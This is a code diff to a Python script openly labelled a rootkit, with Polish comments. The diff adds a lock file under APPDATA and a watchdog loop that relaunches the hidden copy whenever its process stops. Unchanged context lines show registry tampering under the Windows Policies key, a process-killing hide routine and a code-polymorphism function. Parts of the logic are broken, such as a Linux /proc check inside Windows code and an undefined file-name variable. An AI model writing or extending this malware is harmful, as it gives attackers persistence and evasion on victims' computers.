@@ -7,6 +7,34 @@ import random
 import string
 import base64
 
+LOCK_FILE = os.path.join(os.getenv('APPDATA'), '.rootkit', 'rootkit.lock')
+
+def usun_blokade():
+    try:
+        if os.path.exists(LOCK_FILE):
+            os.remove(LOCK_FILE)
+    except Exception:
+        pass
+
+# Sprawdź czy już działa inna instancja
+if os.path.exists(LOCK_FILE):
+    try:
+        with open(LOCK_FILE, 'r') as f:
+            pid = int(f.read())
+            if os.path.exists(f"/proc/{pid}"):  # Dla Linuxa
+                sys.exit(0)
+    except:
+        pass
+    usun_blokade()
+
+try:
+    with open(LOCK_FILE, 'w') as f:
+        f.write(str(os.getpid()))
+except Exception:
+    sys.exit(0)
+
+atexit.register(usun_blokade)
+
 def modify_registry():
     # Open the registry key
     key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_SET_VALUE)
@@ -27,12 +55,17 @@ def hide_process():
     os.system("taskkill /f /im python.exe")
 
 def monitor_process():
-    # Check if the process is running
     while True:
-        if not os.path.exists("C:\\Windows\\System32\\python.exe"):
-            # If the process is not running, start it again
-            os.system("start python {}".format(sys.argv[0]))
-        time.sleep(5)
+        try:
+            # Sprawdź czy główny proces żyje
+            with open(LOCK_FILE, 'r') as f:
+                pid = int(f.read())
+                if not os.path.exists(f"/proc/{pid}"):  # Dla Linuxa
+                    os.system(f"start python {os.path.join(os.getenv('APPDATA'), '.rootkit', new_name)}")
+        except Exception:
+            os.system(f"start python {os.path.join(os.getenv('APPDATA'), '.rootkit', new_name)}")
+        
+        time.sleep(15)  # Zwiększony czas sprawdzania
 
 def polymorphism(code):
     # Perform polymorphism on the code
